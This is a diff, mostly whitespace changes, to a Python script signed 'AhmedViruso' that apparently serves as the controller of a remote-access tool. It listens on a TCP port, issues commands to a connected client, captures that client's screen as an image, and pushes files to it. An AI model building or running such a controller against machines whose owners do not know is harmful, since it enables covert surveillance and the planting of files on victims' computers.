@@ -9,12 +9,11 @@ except:
 print(" - By AhmedViruso")
 
 def Create(): # Create Tcp Socket
+
     try:
 
         global S
-
         S = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-
         S.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
 
     except socket.error as failed:
@@ -31,9 +30,7 @@ def Bind(): # Bind The Socket
         Port = 519  
 
         S.bind((Ip, Port))
-
         S.listen(1)
-
         print(" - Server Is Listening . .")
 
     except socket.error as failed:
@@ -53,32 +50,46 @@ def SendOrders(Con):
     while True:
 
         try: # Check If client is online
+
             Con.send(str.encode(""))
         except: 
+
             print(" - The Connection is Dead ")
             Main()
             continue
 
         Command = input(" > ")
+
         Command = Command.lower() # Change string to lowercase
 
         if(Command == 'screen'):
 
             try:
+
                 Con.send(str.encode(Command)) # Send Command
+
                 F = open("Screen.jpg", "wb") 
                 
                 while True:
+
                     Data = Con.recv(1024) # Receive File Bytes
+
                     F.write(Data)
+
                     Check = len(Data)
+
                     print(" - " + str(len(Data)))
+
                     if(1024 != Check): # If 1024 > length (Data) , Stop Loop
+
                         F.close() # Close File
+
                         print(" - Done")
+
                         break
 
             except:
+
                 print(" - Error 1 , Something Is Wrong")
                 continue
 
@@ -95,7 +106,9 @@ def SendOrders(Con):
                 Recv = Recv.decode("utf-8")
 
                 if(Recv == "file"):
+
                     User = input(" - File Extension -> ")
+
                     Con.send(str.encode(User)) 
 
                 with open(Up, "rb") as F:
@@ -112,7 +125,6 @@ def SendOrders(Con):
 
                 print(" - Error 2 , Something Is Wrong")
                 continue
-
 
 
 def Main():
